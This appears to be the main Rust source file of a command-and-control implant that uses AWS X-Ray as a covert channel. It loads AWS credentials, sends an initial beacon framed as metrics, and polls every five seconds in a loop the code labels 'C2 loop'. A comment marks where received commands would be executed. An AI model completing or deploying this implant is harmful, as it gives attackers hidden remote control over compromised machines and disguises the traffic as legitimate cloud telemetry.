use std::env;
use std::thread::sleep;
use std::time::Duration;
use tracing_subscriber;
use tracing::Level;

mod model;
mod utils;

// Main function now returns a Result to handle errors (like missing env vars)
fn main() -> Result<(), Box<dyn std::error::Error>> {
    tracing_subscriber::fmt()
        .with_max_level(Level::DEBUG)
        .init();

    // The logs will now be active for all subsequent code calls
    tracing::info!("Starting X-Ray agent..."); // <-- This log should now appear

    // Read AWS credentials from environment variables
    let access_key =
        env::var("AWS_ACCESS_KEY_ID").expect("AWS_ACCESS_KEY_ID must be set");
    let secret_key =
        env::var("AWS_SECRET_ACCESS_KEY").expect("AWS_SECRET_ACCESS_KEY must be set");
    
    let instance_id = "rustinstance001";
    let execution_result = "Test payload from Rust port";

    // 1. Publish initial metrics
    match utils::publish_metrics(instance_id, execution_result, &access_key, &secret_key) {
        Ok(()) => {
            println!("Successfully published metrics to AWS X-Ray.");
        }
        Err(e) => {
            eprintln!("Error publishing metrics: {}", e);
        }
    }

    // 2. Start polling for configuration/commands (C2 loop)
    println!("\nStarting command polling loop (pauses for 5s between checks)...");

    loop {
        match utils::poll_configuration(instance_id, &access_key, &secret_key) {
            Ok(command) => {
                if command.is_empty() {
                    print!("."); // Indicate polling is happening
                } else {
                    println!("\n[!! COMMAND RECEIVED !!] Command: '{}'", command);
                    // In a real application, you would execute the command here.
                    // For now, we'll just log it.
                }
            }
            Err(e) => {
                eprintln!("\nError polling configuration: {}", e);
            }
        }
        sleep(Duration::from_secs(5));
    }

    // This part is unreachable due to the loop, but kept for clarity
    #[allow(unreachable_code)] 
    Ok(())
}